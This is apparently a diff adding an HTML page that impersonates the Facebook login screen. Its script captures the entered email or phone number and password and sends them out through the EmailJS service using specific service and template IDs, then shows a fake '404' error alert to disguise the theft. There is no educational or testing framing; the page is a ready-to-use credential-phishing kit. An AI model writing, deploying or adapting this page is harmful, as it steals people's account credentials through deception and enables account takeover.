@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="style.css" />
+  <title>Facebook-log in or sign up</title>
+</head>
+<body>
+
+  <div class="container">
+    <div class="left">
+      <h1 class="logo">facebook</h1>
+      <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
+    </div>
+    <div class="right">
+      <div class="login-box">
+        <form id="signup-form">
+          <input type="text" name="username" placeholder="Email or phone number" required />
+          <input type="password" name="userpassword" placeholder="Password" required />
+          <button type="submit" class="login-btn">Log In</button>
+          <a href="#" class="forgot">Forgotten password?</a>
+          <hr />
+          <button class="create-btn">Create new account</button>
+        </form>
+      </div>
+      <p class="create-page"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+    </div>
+  </div>
+
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+  emailjs.init("hWDrzeJDpEPNANvPG");
+
+  document.addEventListener("DOMContentLoaded", function () {
+    document
+      .getElementById("signup-form")
+      .addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        emailjs.sendForm("service_7w5k56v", "template_0w2g62q", this).then(
+          function () {
+            alert("an error 404 not found");
+          },
+          function (error) {
+            alert("you have an error " + JSON.stringify(error));
+          }
+        );
+      });
+  });
+</script>
+
+
+</body>
+</html>
